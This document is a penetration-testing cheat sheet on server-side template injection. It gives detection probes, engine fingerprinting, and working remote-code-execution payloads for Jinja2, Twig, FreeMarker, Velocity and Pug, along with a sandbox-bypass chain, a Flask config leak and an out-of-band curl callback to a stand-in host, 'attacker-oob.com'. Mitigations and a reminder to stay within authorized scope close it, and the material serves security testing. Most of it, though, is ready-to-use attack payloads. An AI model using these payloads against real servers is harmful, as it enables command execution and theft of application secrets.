# SSTI (SERVER-SIDE TEMPLATE INJECTION) ATTACK PAYLOADS

[PAYLOADALLTHETHINGS — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) · [TPLMAP](https://github.com/epinna/tplmap)

Detection Probe (works across most engines)

    curl -X POST -d 'name={{7*7}}' [URL]/render

Engine Fingerprinting (different engines evaluate different syntax)

    curl -X POST -d 'name=${7*7}' [URL]/render
    curl -X POST -d 'name=#{7*7}' [URL]/render
    curl -X POST -d 'name=<%= 7*7 %>' [URL]/render

SSTI occurs when user input is concatenated into a template string *before* it's compiled, rather than passed in as data to a fixed template. The engine then evaluates the attacker's input as template syntax — not just text to display — which can range from reading server-side variables to full code execution depending on the engine's sandboxing (if any). Most SSTI attacks are really about walking an engine's accessible object graph from "whatever's in scope" back to a function capable of executing code.

## Structure Reference

| Part | Contains | Relevance |
|---|---|---|
| Template source | The literal template string the engine compiles | The attack surface — vulnerable when user input is embedded into this string (e.g. `render_template_string(f"Hello {name}")`), as opposed to passed as a separate context variable |
| Rendering context | Variables/objects the template has access to during evaluation | What the attack actually walks — even a sandboxed engine usually exposes *some* objects, and those objects' attributes/methods are the path to more powerful ones |
| Engine sandbox (if present) | Restrictions on which builtins/classes/methods are reachable from template syntax | The actual security boundary — every advanced SSTI payload is an attempt to find a path through the object graph that the sandbox didn't anticipate blocking |
| Evaluation output | Reflected directly, reflected partially, or not reflected (blind) | Determines exploitation path — reflected SSTI confirms instantly via arithmetic; blind SSTI needs a side-effect (time delay, OOB callback) to confirm |

## Detection & Engine Fingerprinting

| Technique | Payload | Purpose |
|---|---|---|
| Generic arithmetic probe | `{{7*7}}` | If the response reflects `49` instead of the literal string, input is being evaluated, not just displayed — confirms SSTI exists before identifying the specific engine |
| Polyglot probe across syntaxes | `${7*7}`, `#{7*7}`, `<%= 7*7 %>`, `{{7*'7'}}`, `${{7*7}}`, `@(7*7)` | Different engines use different delimiter syntax; firing several at once narrows down the engine by which one evaluates and what the result looks like |
| String multiplication differentiator | `{{7*'7'}}` | Jinja2 (Python) returns `7777777` (string repetition) for this, while Twig (PHP) and other engines error or return something else — useful for distinguishing Python-backed engines from others once basic `{{ }}` syntax is confirmed |
| Error-based fingerprinting | Submit deliberately malformed syntax (e.g. `{{`) and inspect the stack trace/error message | Unhandled template errors frequently leak the exact engine name, version, and file path in the response, which is often the fastest fingerprinting method when error display isn't suppressed |
| Decision-tree payloads (tplmap-style) | A sequence of engine-specific probes tried in order, branching based on which response pattern matches | Mirrors what automated tools do — useful to replicate manually when a tool isn't available or its traffic pattern would be too noisy for the engagement |

## Jinja2 (Python / Flask)

| Technique | Payload | Purpose |
|---|---|---|
| Read a variable from context | `{{config}}` (Flask-specific) | Flask exposes its `config` object to every template by default — often leaks `SECRET_KEY` and other sensitive settings with zero further effort |
| Walk to `__builtins__` via `__init__` | `{{ self.__init__.__globals__.__builtins__ }}` | Confirms whether the standard object-graph walk to Python builtins is reachable from `self` in this context |
| Full RCE via `__builtins__.__import__` | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` | Once builtins are reachable, importing `os` and calling `popen` achieves command execution |
| Sandbox-bypass without `self` (no-args chain) | `{{ ''.__class__.__mro__[1].__subclasses__() }}` then locate a subclass like `subprocess.Popen` by index and instantiate it | Used when `self` isn't in scope; walks from any string literal's class, up the MRO to `object`, and across all loaded subclasses to find one capable of execution |
| Filter-based bypass (no `{{ }}` access, only filters) | `{{ 'id' \| attr('__class__') \| attr('__base__') \| ... }}` (chained `attr`/`map` filters reaching the same builtins path) | Used against hardened Jinja2 sandboxes (e.g. Flask's `SandboxedEnvironment`) that block direct attribute access but still expose filters that can be chained to the same effect |

## Twig (PHP)

| Technique | Payload | Purpose |
|---|---|---|
| Detection | `{{7*7}}` | Twig uses the same `{{ }}` delimiter as Jinja2 — the string-multiplication differentiator above helps tell them apart once basic evaluation is confirmed |
| RCE via filter chaining | `{{ ['id'] \| map('system') \| join }}` | Twig's `map` filter applies a named PHP function to each array element — `system` directly shells out, achieving RCE without needing a sandboxed-class object graph walk |
| RCE via `filter` function | `{{ ['id'] \| filter('system') }}` | Alternate filter-based path to the same `system` call, useful if `map` specifically is blocked by an allowlist |

## FreeMarker (Java)

| Technique | Payload | Purpose |
|---|---|---|
| `Execute` utility class RCE | `<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}` | `Execute` is a built-in FreeMarker utility intended only for trusted templates, but is reachable from any context that allows `?new()` on class names |
| `ObjectConstructor` RCE | `<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","id").start()}` | Alternate built-in utility achieving the same effect via direct `ProcessBuilder` instantiation rather than the `Execute` wrapper |

## Velocity (Java)

| Technique | Payload | Purpose |
|---|---|---|
| `Runtime.exec` via reflection | `#set($e="exec")$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")` | Velocity restricts direct class references in many configurations, so this walks through reflection (`getClass().forName(...)`) starting from a plain string object already in scope |

## Handlebars / Pug / Other JS-Ecosystem Engines

| Technique | Payload (conceptual) | Purpose |
|---|---|---|
| Pug (formerly Jade) RCE | `#{ (function(){ return global.process.mainModule.require('child_process').execSync('id') })() }` | Pug compiles templates to JS functions — if user input reaches the template source (not just locals), this reaches Node's `child_process` directly |
| Handlebars prototype-pollution-adjacent RCE | Crafted helper registration / `{{#with}}` block abuse documented in known Handlebars CVEs for the specific version in use | Handlebars is designed to be logic-less and harder to abuse directly; most known RCE paths are version-specific CVEs rather than a generic universal payload, so version fingerprinting matters more here than elsewhere |

## EXAMPLE PAYLOADS

**Jinja2 full chain (detection → context leak → RCE):**
```python
# 1. Detection
{{7*7}}
# Response contains 49 -> confirmed template evaluation

# 2. Differentiate from Twig/other {{ }} engines
{{7*'7'}}
# Response contains 7777777 -> confirms Python/Jinja2-family engine

# 3. Leak Flask config (often sufficient on its own — may contain SECRET_KEY)
{{config}}

# 4. Full RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Jinja2 sandbox-bypass chain (no `self`, walking via string MRO):**
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Inspect output, locate index of a usable subclass (e.g. subprocess.Popen), then:
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```

**Twig RCE via filter chaining:**
```twig
{{ ['id'] | map('system') | join }}
```

**FreeMarker RCE via Execute utility:**
```freemarker
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Blind SSTI confirmation via OOB (when no output is reflected):**
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl http://attacker-oob.com/ssti-hit').read() }}
```

## Tooling Note

Manual probing builds understanding of the underlying flaw, but dedicated tools automate most of these checks against a live target in one pass: **tplmap** for automated detection and exploitation across Jinja2, Twig, Freemarker, Velocity, Smarty, and more in one scan, and **Burp Suite's** active scanner for basic `{{7*7}}`-style detection during broader crawls. Stay within authorized scope — SSTI frequently leads directly to RCE (see the RCE cheat sheet's SSTI section for the broader execution-impact context), and any payload beyond the agreed proof-of-concept risks real, irreversible impact on production systems.

## Mitigations (for writeups)

- Never construct a template string by concatenating or formatting user input into it — always pass user-controlled data as a context *variable* to a fixed, developer-authored template, never as part of the template source itself.
- Avoid `render_template_string`-style APIs (or equivalents in other engines) entirely for anything touching user input; use named template files with variables passed in.
- If user-influenced templates are a genuine product requirement (e.g. customizable email templates), use a logic-less engine (Mustache, Handlebars in its default logic-less mode) rather than a full-featured engine with object-graph access.
- Run any necessary dynamic template evaluation in a properly isolated sandbox (separate process, minimal permissions, no filesystem/network access) rather than relying solely on the template engine's built-in sandboxing, since most engine sandboxes have a documented history of bypasses.
- Keep template engines patched — several of the engine-specific RCE paths above (especially in the JS ecosystem) are tied to specific CVEs rather than being evergreen, generic techniques.
- Suppress detailed template error messages/stack traces in production responses, since they routinely leak the engine name, version, and file paths that accelerate exploitation.

## Quick Notes

- SSTI exists on a spectrum — some findings only leak in-scope variables (still potentially sensitive, e.g. Flask's `config`), while others reach full RCE; confirm and report the actual achieved impact rather than assuming detection alone means RCE.
- The `{{7*7}}` → `49` test is the standard first probe across nearly every engine family; differentiate the specific engine next (string multiplication, error messages, delimiter syntax) before reaching for engine-specific payloads.
- A successful SSTI-to-RCE chain is functionally a code execution finding — apply the same severity, scope discipline, and minimal-payload practices described in the RCE cheat sheet once you've confirmed evaluation is happening.
